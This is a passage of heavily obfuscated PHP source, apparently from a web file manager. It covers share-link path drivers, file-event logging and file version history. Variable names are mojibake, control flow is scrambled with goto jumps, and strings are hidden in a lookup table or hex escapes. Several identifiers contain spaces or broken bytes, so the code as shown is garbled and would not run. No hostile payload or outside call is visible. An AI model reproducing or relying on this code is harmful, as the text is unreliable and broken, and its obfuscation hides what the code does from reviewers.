trim(KodIO::makeShare($this->pathParse[$D½ˆ­°Êğ¨[393]], $e¼ë¦ñ­ë[$D½ˆ­°Êğ¨[393]]), $D½ˆ­°Êğ¨[8]); } protected function infoParse($c’„©Ôšâ, $DŒ†šº…Ÿ = false, $c»ÎÅõÅ¸‚ = false) { $eË“„ĞÉ =& $_SERVER[ä°„ä°º]; $EÚÖ‹ãôÌ = $this->pathParse[$eË“„ĞÉ[393]]; $f†¹ôß°Î“ = trim($this->pathParse[$eË“„ĞÉ[1085]], $eË“„ĞÉ[8]); return Action($eË“„ĞÉ[1235])->sharePathInfo($EÚÖ‹ãôÌ, $f†¹ôß°Î“); } public function infoFull($b˜ÍÔ´éŒ) { $CĞ›î¦¹‡ =& $_SERVER[ä°„ä°º]; $dò„ö×â‚Ö = explode($CĞ›î¦¹‡[8], trim($b˜ÍÔ´éŒ, $CĞ›î¦¹‡[8])); if (count($dò„ö×â‚Ö) > 1) { $B—¿„×¤§ô = implode($CĞ›î¦¹‡[8], array_splice($dò„ö×â‚Ö, 1)); $C¹’Ì’–â» = $this->model->pathInfoByPath($dò„ö×â‚Ö[0], $B—¿„×¤§ô); if (!$C¹’Ì’–â») { return !1; } $this->pathParse[$CĞ›î¦¹‡[1085]] = $C¹’Ì’–â»[$CĞ›î¦¹‡[395]]; } return $this->infoParse($b˜ÍÔ´éŒ); } public function listAll($FÇ¹ĞÈ ä‚) { goto FÃ”ÖÁ“‹; f™ôòÏ—: $FÇö×Œé‚µ = $this->model->listAll($FÇ¹ĞÈ ä‚); $fõáˆöÀì† = Model($e‰¨Òî›ğ‰[576])->getInfo($cù›È´ØÉ[$e‰¨Òî›ğ‰[468]]); $cµÕÁÚËí = Action($e‰¨Òî›ğ‰[1235]); goto cß¬åÃççò; FÃ”ÖÁ“‹: $e‰¨Òî›ğ‰ =& $_SERVER[ä°„ä°º]; $cù›È´ØÉ = IO::info($this->pathParse[$e‰¨Òî›ğ‰[76]]); if (!$cù›È´ØÉ) { return array(); } goto f™ôòÏ—; cß¬åÃççò: foreach ($FÇö×Œé‚µ as &$b•İÛÊ—ëè) { check_abort(); $b•İÛÊ—ëè[$e‰¨Òî›ğ‰[85]] = $cµÕÁÚËí->_shareItemeParse($b•İÛÊ—ëè[$e‰¨Òî›ğ‰[85]], $fõáˆöÀì†); } unset($b•İÛÊ—ëè); return $FÇö×Œé‚µ; goto dÂÌŸÂô¹; dÂÌŸÂô¹: } } class PathDriverDbShareLink extends PathDriverDB { public function __construct($dø›ŒŸˆ‘) { $this->pathParse = $dø›ŒŸˆ‘; $this->model = Model($_SERVER[ä°„ä°º][1227]); } protected function infoParse($DŒ§É¼Æ¦½, $aø­Ô³¸ˆ‰ = false, $Eø§ØÂ… = false) { $fÏÊ´¥ÛÆ =& $_SERVER[ä°„ä°º]; return Action($fÏÊ´¥ÛÆ[1091])->sharePathInfo($this->pathParse[$fÏÊ´¥ÛÆ[76]], !0); } public function listPath($c¤¬ØõƒÖš, $aÈ…—×âäæ = false) { $aá”ë¢—õŠ =& $_SERVER[ä°„ä°º]; $E½‰ñ±½ô÷ = parent::listPath($c¤¬ØõƒÖš, $aÈ…—×âäæ); foreach ($E½‰ñ±½ô÷ as $BÄøöç°Œë => $e‰ššë¶¹†) { if (!in_array($BÄøöç°Œë, array($aá”ë¢—õŠ[74], $aá”ë¢—õŠ[75]))) { continue; } foreach ($e‰ššë¶¹† as $e•Ä‰š => $Bº¹›Ä¯â) { $E½‰ñ±½ô÷[$BÄøöç°Œë][$e•Ä‰š] = Action($aá”ë¢—õŠ[1091])->shareItemInfo($Bº¹›Ä¯â); } } return $E½‰ñ±½ô÷; } public function listAll($dÜ…Îù¶—•) { goto aâˆ–Ê¢ò ; B»¾»ˆ’˜‚: return $d¤–…Öª‘Š; goto bæÆ¾´”Œ; aâˆ–Ê¢ò : $A¾ÉÅóÀìğ =& $_SERVER[ä°„ä°º]; $CÈÚ ¥á£¹ = IO::info($this->pathParse[$A¾ÉÅóÀìğ[76]]); if (!$CÈÚ ¥á£¹) { return array(); } goto d‘ÇØ§ªÍ£; d‘ÇØ§ªÍ£: $d¤–…Öª‘Š = $this->model->listAll($dÜ…Îù¶—•); foreach ($d¤–…Öª‘Š as &$E™³Ü›¦Ç¼) { $E™³Ü›¦Ç¼[$A¾ÉÅóÀìğ[85]] = Action($A¾ÉÅóÀìğ[1091])->shareItemInfo($E™³Ü›¦Ç¼[$A¾ÉÅóÀìğ[85]]); } unset($E™³Ü›¦Ç¼); goto B»¾»ˆ’˜‚; bæÆ¾´”Œ: } } class PathDriverDriverShareItem { public function __construct($Dœ°†…Á) { $this->pathParse = $Dœ°†…Á; } public function __call($BÛÇÁŠÀ—, $Bõ´Å¢†Äœ) { $D“ÀÑÉŒï =& $_SERVER[ä°„ä°º]; if (method_exists($this, $BÛÇÁŠÀ—)) { return; } $AŞÒ’ö†‚› = call_user_func_array(array($D“ÀÑÉŒï[1236], $BÛÇÁŠÀ—), $Bõ´Å¢†Äœ); $E¸‡†’•Å = array($D“ÀÑÉŒï[1237], $D“ÀÑÉŒï[1238], $D“ÀÑÉŒï[1239], $D“ÀÑÉŒï[1240], $D“ÀÑÉŒï[531], $D“ÀÑÉŒï[533], $D“ÀÑÉŒï[1241], $D“ÀÑÉŒï[107], $D“ÀÑÉŒï[1242], $D“ÀÑÉŒï[1243]); if (in_array($BÛÇÁŠÀ—, $E¸‡†’•Å)) { $AŞÒ’ö†‚› = $this->getPathOuter($AŞÒ’ö†‚›); } return $AŞÒ’ö†‚›; } public function copy($d÷èÁŸ•«ï, $b‘™»Á’ÕÁ, $D¥öÑøºµ = false) { return $this->copyMove($d÷èÁŸ•«ï, $b‘™»Á’ÕÁ, $D¥öÑøºµ, $_SERVER[ä°„ä°º][531]); } public function move($eÉÙÁ‚°, $c·†ŒÆ¨Ğƒ, $aÄ¦˜Ñƒ Î = false) { return $this->copyMove($eÉÙÁ‚°, $c·†ŒÆ¨Ğƒ, $aÄ¦˜Ñƒ Î, $_SERVER[ä°„ä°º][533]); } private function copyMove($DÜ·íİ’’°, $dº¥˜©¥µö, $c¢ÇÑ¨Ïµ, $e‰Œ†…ŒÂç) { goto B‚ŸãÉ¯‡; eèÉÚ÷˜Å: return $B‰Š…‚ªº¶; goto AÖŒ…ë„µ‡; cùÀöø£’µ: if ($B«ˆ…ùïä->pathParse[$F”ÉÚö×ŠÙ[1069]]) { $dº¥˜©¥µö = $B«ˆ…ùïä->pathParse[$F”ÉÚö×ŠÙ[1069]]; } else { $dº¥˜©¥µö = $F¬°‚½¿ä; } $B‰Š…‚ªº¶ = IO::copyMove($DÜ·íİ’’°, $dº¥˜©¥µö, $c¢ÇÑ¨Ïµ, $e‰Œ†…ŒÂç); $B‰Š…‚ªº¶ = $this->getPathOuter($B‰Š…‚ªº¶); goto eèÉÚ÷˜Å; B‚ŸãÉ¯‡: $F”ÉÚö×ŠÙ =& $_SERVER[ä°„ä°º]; $F¬°‚½¿ä = $dº¥˜©¥µö; $B«ˆ…ùïä = IO::driverMake($dº¥˜©¥µö); goto cùÀöø£’µ; AÖŒ…ë„µ‡: } public function pathThis($DÜ†ÓÅ³) { return get_path_this($this->pathParse[$_SERVER[ä°„ä°º][76]]); } public function pathFather($e’¼°à—”£) { return get_path_father($this->pathParse[$_SERVER[ä°„ä°º][76]]); } public function iconvSystem($fˆŠæéå¢…) { return $fˆŠæéå¢…; } protected function infoParse($D½÷¶¨Ğ‹¶, $EÆ¦çÆé© = false) { $eå¹£µØÅ¬ =& $_SERVER[ä°„ä°º]; $eòä‹È‹Í‹ = $this->pathParse[$eå¹£µØÅ¬[466]][$eå¹£µØÅ¬[1092]] . $this->pathParse[$eå¹£µØÅ¬[1085]]; if ($EÆ¦çÆé©) { $F¤ö¤ÎÛø× = IO::infoWithChildren($eòä‹È‹Í‹); } else { $F¤ö¤ÎÛø× = IO::info($eòä‹È‹Í‹); } $AÏªÜ¿ËÜ = $this->pathParse[$eå¹£µØÅ¬[466]]; return Action($eå¹£µØÅ¬[1235])->_shareItemeParse($F¤ö¤ÎÛø×, $AÏªÜ¿ËÜ); } public function listAll($fÌîÕÖŸê±) { $E¬”ò”¡ñæ =& $_SERVER[ä°„ä°º]; $DˆÜôˆÌí = IO::listAll($fÌîÕÖŸê±); $dèİóƒî¨‚ = $this->pathParse[$E¬”ò”¡ñæ[466]]; foreach ($DˆÜôˆÌí as &$d»¿¡¼âßÜ) { check_abort(); $B£…İ‹‹ËŸ = IO::info($d»¿¡¼âßÜ[$E¬”ò”¡ñæ[76]]); $B£…İ‹‹ËŸ = is_array($B£…İ‹‹ËŸ) ? $B£…İ‹‹ËŸ : array(); $d»¿¡¼âßÜ = array_merge($B£…İ‹‹ËŸ, $d»¿¡¼âßÜ); $d»¿¡¼âßÜ[$E¬”ò”¡ñæ[85]] = Action($E¬”ò”¡ñæ[1235])->_shareItemeParse($d»¿¡¼âßÜ, $dèİóƒî¨‚); } unset($d»¿¡¼âßÜ); return $DˆÜôˆÌí; } public function getPathOuter($fÖ¢ö¿æÊŠ) { goto F÷¡‹Ïª˜ø; CÒ­òË³ßÆ: if (substr($F‡­Ê¶î, 0, strlen($aŸ×¹òˆ³)) != $aŸ×¹òˆ³) { return !1; } return $this->pathParse[$F§¹¯êÊæ[1086]] . $F§¹¯êÊæ[8] . ltrim($e ¼šÜñÕ§, $F§¹¯êÊæ[8]); goto FºÌ­æ…ë¦; BãÕ—¥¨¦É: $F‡­Ê¶î = KodIO::clear($fÖ¢ö¿æÊŠ); $aŸ×¹òˆ³ = KodIO::clear($this->pathParse[$F§¹¯êÊæ[466]][$F§¹¯êÊæ[1092]]); $e ¼šÜñÕ§ = substr($F‡­Ê¶î, strlen($aŸ×¹òˆ³)); goto CÒ­òË³ßÆ; F÷¡‹Ïª˜ø: $F§¹¯êÊæ =& $_SERVER[ä°„ä°º]; $D¦¦µ‚§Ø« = KodIO::parse($fÖ¢ö¿æÊŠ); if ($D¦¦µ‚§Ø«[$F§¹¯êÊæ[29]] == KodIO::KOD_SHARE_ITEM) { return $D¦¦µ‚§Ø«[$F§¹¯êÊæ[76]]; } goto BãÕ—¥¨¦É; FºÌ­æ…ë¦: } public function getType() { $FÎ¬¸âªí =& $_SERVER[ä°„ä°º]; $Cñô¯¸„Ê = str_replace($FÎ¬¸âªí[72], $FÎ¬¸âªí[33], get_class($this)); return strtolower($Cñô¯¸„Ê); } public function isTypeObject($aõ†îœ¹º) { return IO::isTypeObject($aõ†îœ¹º); } public function info($eî™™„ªçš) { return $this->infoParse($eî™™„ªçš); } public function infoAuth($d†ºµ¥Ğ®Ç) { return $this->infoParse($d†ºµ¥Ğ®Ç); } public function infoWithChildren($fÀ×ëÈÁ›ê) { return $this->infoParse($fÀ×ëÈÁ›ê, !0); } public function infoFull($aàÊÚÅ†›÷) { return $this->infoParse($aàÊÚÅ†›÷); } } goto fÊ”±‘²‚¿; E÷åë­ÇŞ¸: class SourceEventModel extends ModelBase { protected $tableName = "\x69\157\x5f\163\157\x75\x72\x63\x65\137\x65\166\145\156\x74"; protected $dataAuto = array(array("\143\162\x65\141\x74\145\x54\x69\x6d\x65", "\x74\x69\155\145", "\x69\x6e\163\145\162\164", "\146\165\x6e\143\164\x69\157\156"), array("\x64\145\163\x63", '', "\x69\x6e\163\145\162\164\54\x75\160\144\141\x74\x65\54\163\x65\154\x65\143\164", "\x6a\x73\x6f\156")); protected $eventSave = true; public function recodeStop() { $this->eventSave = !1; } public function recodeStart() { $this->eventSave = !0; } public function addEvent($EÕŒÌÔ³ó, $aÇÈÖÉöÍ, $EÀÅ‘ù‚¨ = '') { goto AØ«Œˆ‰à; F»›…æÙğ: if (!$Cºâ²À©è²) { return !1; } if ($this->isCacheEvent($Cºâ²À©è², $aÇÈÖÉöÍ)) { return; } if ($EÀÅ‘ù‚¨ && is_string($EÀÅ‘ù‚¨)) { $EÀÅ‘ù‚¨ = array($CßÜæöÎ×[1753] => $EÀÅ‘ù‚¨); } goto a–ÙŸ†˜Æ¤; aÏïÍ²Ğ: return $this->add($d¬Õƒá‘ïù); goto E…±ÎŞ¥ˆ; AØ«Œˆ‰à: $CßÜæöÎ× =& $_SERVER[ä°„ä°º]; if (!$this->eventSave) { return; } $Cºâ²À©è² = Model($CßÜæöÎ×[1227])->sourceInfo($EÕŒÌÔ³ó); goto F»›…æÙğ; a–ÙŸ†˜Æ¤: $d¬Õƒá‘ïù = array($CßÜæöÎ×[410] => $EÕŒÌÔ³ó, $CßÜæöÎ×[1927] => $Cºâ²À©è²[$CßÜæöÎ×[478]], $CßÜæöÎ×[1928] => $Cºâ²À©è²[$CßÜæöÎ×[28]], $CßÜæöÎ×[500] => !empty($Cºâ²À©è²[$CßÜæöÎ×[500]]) ? $Cºâ²À©è²[$CßÜæöÎ×[500]] : $CßÜæöÎ×[33], $CßÜæöÎ×[1542] => USER_ID, $CßÜæöÎ×[415] => $aÇÈÖÉöÍ, $CßÜæöÎ×[1544] => $EÀÅ‘ù‚¨); $this->addSystemLog($aÇÈÖÉöÍ, $d¬Õƒá‘ïù); unset($d¬Õƒá‘ïù[$CßÜæöÎ×[1928]], $d¬Õƒá‘ïù[$CßÜæöÎ×[500]]); goto aÏïÍ²Ğ; E…±ÎŞ¥ˆ: } private function addSystemLog($C©¢±ÚÆ‡, $BğƒºÅ) { $A…Ìê„ğÚ“ =& $_SERVER[ä°„ä°º]; if ($C©¢±ÚÆ‡ == $A…Ìê„ğÚ“[1929]) { $C©¢±ÚÆ‡ = $BğƒºÅ[$A…Ìê„ğÚ“[431]][$A…Ìê„ğÚ“[1930]]; } else { if (in_array($C©¢±ÚÆ‡, array($A…Ìê„ğÚ“[1697], $A…Ìê„ğÚ“[1931]))) { $C©¢±ÚÆ‡ = $BğƒºÅ[$A…Ìê„ğÚ“[431]][$A…Ìê„ğÚ“[738]]; } } $CŠìó•ØÂÙ = array_merge($BğƒºÅ, array($A…Ìê„ğÚ“[1932] => $BğƒºÅ[$A…Ìê„ğÚ“[395]], $A…Ìê„ğÚ“[1933] => $BğƒºÅ[$A…Ìê„ğÚ“[1933]])); Model($A…Ìê„ğÚ“[1661])->addLog($A…Ìê„ğÚ“[1934] . $C©¢±ÚÆ‡, $CŠìó•ØÂÙ); } private function isCacheEvent($a×ËŠ—”¥ã, $BÆ³ò‹‹ÄÏ) { if ($a×ËŠ—”¥ã[$_SERVER[ä°„ä°º][404]] == SourceModel::TYPE_SYSTEM) { return !0; } return !1; } public function eventCreate($aÖ§Û›ÛÜî, $f«éäÁÖ¡) { $EÊ¨É‡Ò‡ =& $_SERVER[ä°„ä°º]; $dÇ¹›òá = Model($EÊ¨É‡Ò‡[1227])->sourceInfo($aÖ§Û›ÛÜî); $B–³¦ãÔà… = array($EÊ¨É‡Ò‡[1930] => $f«éäÁÖ¡, $EÊ¨É‡Ò‡[28] => $dÇ¹›òá[$EÊ¨É‡Ò‡[28]]); return $this->addEvent($aÖ§Û›ÛÜî, $EÊ¨É‡Ò‡[1929], $B–³¦ãÔà…); } public function eventFileEdit($eµ²¦ƒ±™¨) { $D±•ŒÅßì½ =& $_SERVER[ä°„ä°º]; $DÛ²©Í–‘á = array($D±•ŒÅßì½[1935] => $_SERVER[$D±•ŒÅßì½[1936]], $D±•ŒÅßì½[1937] => strtolower(ACTION)); return $this->addEvent($eµ²¦ƒ±™¨, $D±•ŒÅßì½[1687], $DÛ²©Í–‘á); } public function eventRecycle($dÃš‡§øÃ, $F³—™£øÓƒ) { return $this->addEvent($dÃš‡§øÃ, $_SERVER[ä°„ä°º][1931], $F³—™£øÓƒ); } public function eventRemove($c±â¤Šš¢ã) { $Dê…Î¦Ñòñ =& $_SERVER[ä°„ä°º]; $e¼†Ï‰·ö = Model($Dê…Î¦Ñòñ[1227])->sourceInfo($c±â¤Šš¢ã); $b„½Ê¾ÑÑ› = $e¼†Ï‰·ö[$Dê…Î¦Ñòñ[28]]; return $this->addEvent($e¼†Ï‰·ö[$Dê…Î¦Ñòñ[478]], $Dê…Î¦Ñòñ[1686], $b„½Ê¾ÑÑ›); } public function eventShare($AœÜ¾ÇÈé†, $EÀ¥¯¼‘¡ˆ) { return $this->addEvent($AœÜ¾ÇÈé†, $_SERVER[ä°„ä°º][1697], $EÀ¥¯¼‘¡ˆ); } public function eventMove($CªÎÁ½ˆĞÂ, $fñõÓâƒåƒ, $DÔ”¬Â¹«µ) { goto Bï‹ë»öÅ¹; B©ï£†ë‡“: $DÇ¥À˜‰ì¼ = $AØÑÏ¢ƒ»->sourceInfo($fñõÓâƒåƒ); $f—†âİ³ğ = $AØÑÏ¢ƒ»->sourceInfo($DÔ”¬Â¹«µ); $aĞˆ±ĞÑ˜ó = array($bµÑ»‹Îò[1076] => $fñõÓâƒåƒ, $bµÑ»‹Îò[1938] => $DÇ¥À˜‰ì¼[$bµÑ»‹Îò[28]], $bµÑ»‹Îò[1918] => !empty($DÇ¥À˜‰ì¼[$bµÑ»‹Îò[500]]) ? $DÇ¥À˜‰ì¼[$bµÑ»‹Îò[500]] : $bµÑ»‹Îò[33], $bµÑ»‹Îò[1077] => $DÔ”¬Â¹«µ, $bµÑ»‹Îò[1939] => $f—†âİ³ğ[$bµÑ»‹Îò[28]], $bµÑ»‹Îò[1940] => !empty($f—†âİ³ğ[$bµÑ»‹Îò[500]]) ? $f—†âİ³ğ[$bµÑ»‹Îò[500]] : $bµÑ»‹Îò[33]); goto E²ø ƒƒÊâ; Bï‹ë»öÅ¹: $bµÑ»‹Îò =& $_SERVER[ä°„ä°º]; $AØÑÏ¢ƒ» = Model($bµÑ»‹Îò[1227]); $b†ğ­‡•ˆ² = $AØÑÏ¢ƒ»->sourceInfo($CªÎÁ½ˆĞÂ); goto B©ï£†ë‡“; Dë·„ğ¶ˆŸ: $this->addEvent($fñõÓâƒåƒ, $bµÑ»‹Îò[1941], $aĞˆ±ĞÑ˜ó); goto AªÅÕ˜¹¸à; E²ø ƒƒÊâ: $this->addEvent($CªÎÁ½ˆĞÂ, $bµÑ»‹Îò[533], $aĞˆ±ĞÑ˜ó); $b†ğ­‡•ˆ² = $AØÑÏ¢ƒ»->sourceInfo($CªÎÁ½ˆĞÂ); $aĞˆ±ĞÑ˜ó = array($bµÑ»‹Îò[395] => $b†ğ­‡•ˆ²[$bµÑ»‹Îò[395]], $bµÑ»‹Îò[28] => $b†ğ­‡•ˆ²[$bµÑ»‹Îò[28]]); goto Dë·„ğ¶ˆŸ; AªÅÕ˜¹¸à: } public function eventCopy($BÍ®õéÀ¾Š) { $this->eventCreate($BÍ®õéÀ¾Š, $_SERVER[ä°„ä°º][531]); } public function eventRename($aóİù¢é¿, $A¦°¯ö–¬, $Bù¡ò³¡—ä) { $b‚¡®ÑÏƒ¾ =& $_SERVER[ä°„ä°º]; $fÒ¢ÇÅÅ³ = array($b‚¡®ÑÏƒ¾[1076] => $A¦°¯ö–¬, $b‚¡®ÑÏƒ¾[1077] => $Bù¡ò³¡—ä); return $this->addEvent($aóİù¢é¿, $b‚¡®ÑÏƒ¾[1241], $fÒ¢ÇÅÅ³); } public function eventAddComment($bö¢¾ˆä, $a¶”„í¬»å) { return $this->addEvent($bö¢¾ˆä, $_SERVER[ä°„ä°º][1942], $a¶”„í¬»å); } public function eventAddDesc($aö›‹ñÈŠŠ, $dÇÅ´˜Şù¬) { return $this->addEvent($aö›‹ñÈŠŠ, $_SERVER[ä°„ä°º][1943], $dÇÅ´˜Şù¬); } public function listBySource($Bã¹âÅ²¸ï) { goto E¸ëáÏï«Ô; a¡óÚØòÈ: return $this->eventListParse($Eô‹Âó †ã, $Bã¹âÅ²¸ï); goto BÑÉË²‡ïò; E¸ëáÏï«Ô: $Bªä•ï³• =& $_SERVER[ä°„ä°º]; $aâ®Ÿåññö = Model($Bªä•ï³•[1227])->sourceInfo($Bã¹âÅ²¸ï); $F•Ã«õ‡´œ = array($Bªä•ï³•[410] => $Bã¹âÅ²¸ï); goto Eçˆ„¿ïá; Eçˆ„¿ïá: if ($aâ®Ÿåññö[$Bªä•ï³•[403]] == $Bªä•ï³•[87]) { $e‹—Ù»¼Ê• = Model($Bªä•ï³•[1227])->listSearchChildren($Bã¹âÅ²¸ï, 20000); $e‹—Ù»¼Ê•[] = $Bã¹âÅ²¸ï . $Bªä•ï³•[375]; $F•Ã«õ‡´œ = array($Bªä•ï³•[395] => array($Bªä•ï³•[7], $e‹—Ù»¼Ê•)); } $Eô‹Âó †ã = $this->where($F•Ã«õ‡´œ)->order($Bªä•ï³•[1944])->selectPage(); if ($Eô‹Âó †ã[$Bªä•ï³•[364]][$Bªä•ï³•[365]] == 0) { $Eô‹Âó †ã[$Bªä•ï³•[364]][$Bªä•ï³•[365]] = 1; $Eô‹Âó †ã[$Bªä•ï³•[367]] = array(array($Bªä•ï³•[410] => $Bã¹âÅ²¸ï, $Bªä•ï³•[1927] => $aâ®Ÿåññö[$Bªä•ï³•[478]], $Bªä•ï³•[1542] => $aâ®Ÿåññö[$Bªä•ï³•[432]], $Bªä•ï³•[415] => $Bªä•ï³•[1945], $Bªä•ï³•[416] => $aâ®Ÿåññö[$Bªä•ï³•[194]], $Bªä•ï³•[1544] => $Bªä•ï³•[33])); } goto a¡óÚØòÈ; BÑÉË²‡ïò: } private function eventListParse($aŞºàì„ÚÚ, $fÇˆ™¤îñÚ) { goto Eİõï±îË; Eİõï±îË: $C‚ÏÒŸ²¶¦ =& $_SERVER[ä°„ä°º]; $DŒ±£“¢È = $aŞºàì„ÚÚ[$C‚ÏÒŸ²¶¦[367]]; $aİµé’Ã• = array_to_keyvalue($DŒ±£“¢È, $C‚ÏÒŸ²¶¦[33], $C‚ÏÒŸ²¶¦[395]); goto a¬ó©²˜˜Á; EÊÕ¢¯“÷: $FùŞ¯†¯­Ë = Model($C‚ÏÒŸ²¶¦[813])->sourceListInfo($aİµé’Ã•, !0); foreach ($DŒ±£“¢È as &$B‘µÌêÏùĞ) { if ($B‘µÌêÏùĞ[$C‚ÏÒŸ²¶¦[29]] == $C‚ÏÒŸ²¶¦[533] && isset($B‘µÌêÏùĞ[$C‚ÏÒŸ²¶¦[431]][$C‚ÏÒŸ²¶¦[1076]])) { $B‘µÌêÏùĞ[$C‚ÏÒŸ²¶¦[431]][$C‚ÏÒŸ²¶¦[1076]] = $FùŞ¯†¯­Ë[$B‘µÌêÏùĞ[$C‚ÏÒŸ²¶¦[431]][$C‚ÏÒŸ²¶¦[1076]]]; $B‘µÌêÏùĞ[$C‚ÏÒŸ²¶¦[431]][$C‚ÏÒŸ²¶¦[1077]] = $FùŞ¯†¯­Ë[$B‘µÌêÏùĞ[$C‚ÏÒŸ²¶¦[431]][$C‚ÏÒŸ²¶¦[1077]]]; } if ($B‘µÌêÏùĞ[$C‚ÏÒŸ²¶¦[29]] == $C‚ÏÒŸ²¶¦[1941] && isset($B‘µÌêÏùĞ[$C‚ÏÒŸ²¶¦[431]][$C‚ÏÒŸ²¶¦[395]])) { $B‘µÌêÏùĞ[$C‚ÏÒŸ²¶¦[431]][$C‚ÏÒŸ²¶¦[395]] = $FùŞ¯†¯­Ë[$B‘µÌêÏùĞ[$C‚ÏÒŸ²¶¦[431]][$C‚ÏÒŸ²¶¦[395]]]; } $B‘µÌêÏùĞ[$C‚ÏÒŸ²¶¦[85]] = $FùŞ¯†¯­Ë[$B‘µÌêÏùĞ[$C‚ÏÒŸ²¶¦[395]]]; $B‘µÌêÏùĞ[$C‚ÏÒŸ²¶¦[1946]] = $FùŞ¯†¯­Ë[$B‘µÌêÏùĞ[$C‚ÏÒŸ²¶¦[1933]]]; if ($B‘µÌêÏùĞ[$C‚ÏÒŸ²¶¦[29]] == $C‚ÏÒŸ²¶¦[1686]) { $B‘µÌêÏùĞ[$C‚ÏÒŸ²¶¦[1946]] = $B‘µÌêÏùĞ[$C‚ÏÒŸ²¶¦[85]]; $B‘µÌêÏùĞ[$C‚ÏÒŸ²¶¦[1933]] = $B‘µÌêÏùĞ[$C‚ÏÒŸ²¶¦[1946]][$C‚ÏÒŸ²¶¦[395]]; $B‘µÌêÏùĞ[$C‚ÏÒŸ²¶¦[85]] = !1; $B‘µÌêÏùĞ[$C‚ÏÒŸ²¶¦[395]] = $C‚ÏÒŸ²¶¦[33]; } $B‘µÌêÏùĞ[$C‚ÏÒŸ²¶¦[1877]] = $c¤âç£…§ø[$B‘µÌêÏùĞ[$C‚ÏÒŸ²¶¦[1551]]]; } unset($B‘µÌêÏùĞ); goto B‡øÄàšäŠ; B‡øÄàšäŠ: $aŞºàì„ÚÚ[$C‚ÏÒŸ²¶¦[367]] = $DŒ±£“¢È; return $aŞºàì„ÚÚ; goto b½í¼ ·¦è; a×ƒÇ‰¹å: $aİµé’Ã• = array_unique($aİµé’Ã•); $c«¼‹Ïê‡ = array_unique(array_to_keyvalue($DŒ±£“¢È, $C‚ÏÒŸ²¶¦[33], $C‚ÏÒŸ²¶¦[1551])); $c¤âç£…§ø = Model($C‚ÏÒŸ²¶¦[519])->userListInfo($c«¼‹Ïê‡); goto EÊÕ¢¯“÷; a¬ó©²˜˜Á: $d¨ª“— = array_to_keyvalue($DŒ±£“¢È, $C‚ÏÒŸ²¶¦[33], $C‚ÏÒŸ²¶¦[1933]); foreach ($DŒ±£“¢È as $B‘µÌêÏùĞ) { $F‰’âø®Çº = $B‘µÌêÏùĞ[$C‚ÏÒŸ²¶¦[431]]; if ($B‘µÌêÏùĞ[$C‚ÏÒŸ²¶¦[29]] == $C‚ÏÒŸ²¶¦[533] && isset($F‰’âø®Çº[$C‚ÏÒŸ²¶¦[1076]])) { $aİµé’Ã•[] = $F‰’âø®Çº[$C‚ÏÒŸ²¶¦[1076]] . $C‚ÏÒŸ²¶¦[33]; $aİµé’Ã•[] = $F‰’âø®Çº[$C‚ÏÒŸ²¶¦[1077]] . $C‚ÏÒŸ²¶¦[33]; } if ($B‘µÌêÏùĞ[$C‚ÏÒŸ²¶¦[29]] == $C‚ÏÒŸ²¶¦[1941] && isset($F‰’âø®Çº[$C‚ÏÒŸ²¶¦[395]])) { $aİµé’Ã•[] = $F‰’âø®Çº[$C‚ÏÒŸ²¶¦[395]] . $C‚ÏÒŸ²¶¦[33]; } } $aİµé’Ã• = array_merge($aİµé’Ã•, $d¨ª“—, array($fÇˆ™¤îñÚ . $C‚ÏÒŸ²¶¦[33])); goto a×ƒÇ‰¹å; b½í¼ ·¦è: } public function removeBySource($D³ùõ’¢»Ñ) { $CíÙ·Î¸Ö = array($_SERVER[ä°„ä°º][410] => $D³ùõ’¢»Ñ); $this->where($CíÙ·Î¸Ö)->remove(); } } class SourceHistoryModel extends ModelBase { protected $tableName = "\x69\157\137\x73\157\x75\162\143\145\x5f\x68\151\x73\x74\157\162\x79"; public function historyCount($Bä†°•¨ƒÓ) { goto DÆŒï‘ÒšŒ; bÆ®Üå›æó: $C°‘õÀšİ = array($BÚÖò[395], $BÚÖò[1752] => $BÚÖò[480]); $fÔù¡—Ìçæ = array($BÚÖò[395] => array($BÚÖò[7], $Bä†°•¨ƒÓ)); $f½ñÇà•¸İ = $this->field($C°‘õÀšİ)->where($fÔù¡—Ìçæ)->group($BÚÖò[395])->select(); goto dìÙÃÉ¦ãÄ; dìÙÃÉ¦ãÄ: return array_to_keyvalue($f½ñÇà•¸İ, $BÚÖò[395], $BÚÖò[480]); goto c¢×ÔØÙÂ; DÆŒï‘ÒšŒ: $BÚÖò =& $_SERVER[ä°„ä°º]; if (!$Bä†°•¨ƒÓ) { return array(); } if (is_string($Bä†°•¨ƒÓ) || is_int($Bä†°•¨ƒÓ)) { $Bä†°•¨ƒÓ = array($Bä†°•¨ƒÓ); } goto bÆ®Üå›æó; c¢×ÔØÙÂ: } public function addHistory($fù±Ã…·ö, $D™£¶Ï‚ˆ‘ = '') { $eÊù¼©œ…î =& $_SERVER[ä°„ä°º]; $A÷¥ëÃ©¿® = array($eÊù¼©œ…î[410] => $fù±Ã…·ö[$eÊù¼©œ…î[395]], $eÊù¼©œ…î[1542] => isset($fù±Ã…·ö[$eÊù¼©œ…î[434]]) ? $fù±Ã…·ö[$eÊù¼©œ…î[434]] : $fù±Ã…·ö[$eÊù¼©œ…î[432]], $eÊù¼©œ…î[448] => $fù±Ã…·ö[$eÊù¼©œ…î[447]], $eÊù¼©œ…î[561] => $fù±Ã…·ö[$eÊù¼©œ…î[78]], $eÊù¼©œ…î[1947] => $D™£¶Ï‚ˆ‘); $EŞ‡µÛÖø = $GLOBALS[$eÊù¼©œ…î[6]][$eÊù¼©œ…î[88]][$eÊù¼©œ…î[1125]]; if ($EŞ‡µÛÖø > 1) { $this->historyAutoClear($A÷¥ëÃ©¿®[$eÊù¼©œ…î[395]]); $this->add($A÷¥ëÃ©¿®); } Hook::trigger($eÊù¼©œ…î[1948], $A÷¥ëÃ©¿®); Model($eÊù¼©œ…î[1949])->eventFileEdit($fù±Ã…·ö[$eÊù¼©œ…î[395]]); } private function historyAutoClear($Aô–ÃæÇ›) { goto B¥·´¢ˆİ¾; c†¦ÉšŒ¶ : $a ˜„ºŸ”Ä = array_to_keyvalue($fã†ÍŠŒ§Û, $Aİ½®œˆÖª[33], $Aİ½®œˆÖª[393]); $a ˜„ºŸ”Ä = array_slice($a ˜„ºŸ”Ä, $cÔâÀÀçµÉ); $C–¹ôä°”… = array_to_keyvalue($fã†ÍŠŒ§Û, $Aİ½®œˆÖª[33], $Aİ½®œˆÖª[447]); goto a¬ÉœæÀŒŞ; B¥·´¢ˆİ¾: $Aİ½®œˆÖª =& $_SERVER[ä°„ä°º]; $dšášè° = Model($Aİ½®œˆÖª[753])->get($Aİ½®œˆÖª[1147]); $BğåÚğãæÖ = 